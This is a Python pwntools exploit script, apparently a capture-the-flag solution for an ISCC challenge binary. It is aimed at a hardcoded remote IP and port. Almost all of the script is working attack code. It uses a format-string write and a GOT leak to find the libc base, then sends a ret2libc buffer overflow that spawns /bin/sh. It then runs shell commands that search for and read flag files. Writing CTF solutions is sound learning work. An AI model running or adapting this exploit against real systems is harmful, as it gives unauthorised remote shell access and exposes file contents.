"""
用法:
1. 把 solve.py 和 attachment-9 放在同一个目录下。
2. 直接打默认远程:
       python solve.py
3. 自定义远程 IP 和端口:
       python solve.py 39.96.193.120 10000
4. 本地调试(需要 Linux/WSL 且能运行 32 位 ELF):
       python solve.py LOCAL

说明:
- 如果不传参数, 默认使用下面的 DEFAULT_HOST / DEFAULT_PORT。
- 脚本会默认读取当前脚本同目录下的 attachment-9。
"""

from pwn import *
import re
import sys
from pathlib import Path


context.clear(arch="i386", os="linux")
context.log_level = "info"

SCRIPT_DIR = Path(__file__).resolve().parent
BINARY_PATH = SCRIPT_DIR / "attachment-9"
DEFAULT_HOST = "39.96.193.120"
DEFAULT_PORT = 10000

# libc identified via leaked read@got + libc.rip
READ_OFF = 0x0F0790
SYSTEM_OFF = 0x041360
BINSH_OFF = 0x18C363


def parse_target():
    if len(sys.argv) >= 2 and sys.argv[1].upper() == "LOCAL":
        return True, None, None

    host = DEFAULT_HOST
    port = DEFAULT_PORT

    if len(sys.argv) >= 2:
        host = sys.argv[1]
    if len(sys.argv) >= 3:
        port = int(sys.argv[2])

    return False, host, port


def main():
    is_local, host, port = parse_target()

    if not BINARY_PATH.exists():
        log.failure(f"binary not found: {BINARY_PATH}")
        sys.exit(1)

    elf = context.binary = ELF(str(BINARY_PATH))

    if is_local:
        io = process(elf.path)
    else:
        log.info(f"connecting to {host}:{port}")
        io = remote(host, port)

    # Drain the banner/prompt without depending on an exact delimiter.
    banner = io.recvrepeat(1)
    if banner:
        log.info("received banner/prompt")

    # =========================
    # Stage 1: format string
    # - write target_val -> 5
    # - leak read@got
    # =========================
    # arg4 = &target_val
    # arg5 = &read@got
    # Count math:
    #   8 bytes of raw pointers + 4 leaked bytes + 249 printed padding = 261 = 5 mod 256
    # so %4$hhn writes 0x05 into target_val
    fmt = p32(elf.symbols["target_val"]) + p32(elf.got["read"]) + b"%5$.4s%249c%4$hhn"
    assert len(fmt) <= 0x20
    io.send(fmt)

    sleep(0.2)
    out = io.recvrepeat(1)
    read_addr = u32(out[8:12])
    libc_base = read_addr - READ_OFF
    system_addr = libc_base + SYSTEM_OFF
    binsh_addr = libc_base + BINSH_OFF

    log.success(f"read@libc = {hex(read_addr)}")
    log.success(f"libc base = {hex(libc_base)}")
    log.success(f"system    = {hex(system_addr)}")
    log.success(f"/bin/sh   = {hex(binsh_addr)}")

    # =========================
    # Stage 2: ret2libc
    # =========================
    payload = flat(
        b"A" * 0x94,
        system_addr,
        0xDEADBEEF,
        binsh_addr,
    )
    io.send(payload)

    # Spawn shell and fetch flag automatically
    sleep(0.5)
    io.sendline(
        b'echo START; '
        b'cat /flag* 2>/dev/null; '
        b'cat flag* 2>/dev/null; '
        b'find / -maxdepth 3 -name "flag*" 2>/dev/null; '
        b'echo END'
    )

    data = io.recvrepeat(3)
    text = data.decode("latin-1", errors="replace")
    print(text)

    m = re.search(r"ISCC\{[^}]+\}", text)
    if m:
        log.success(f"FLAG = {m.group(0)}")
    else:
        log.warning("No flag regex matched; see output above.")

    io.close()


if __name__ == "__main__":
    main()
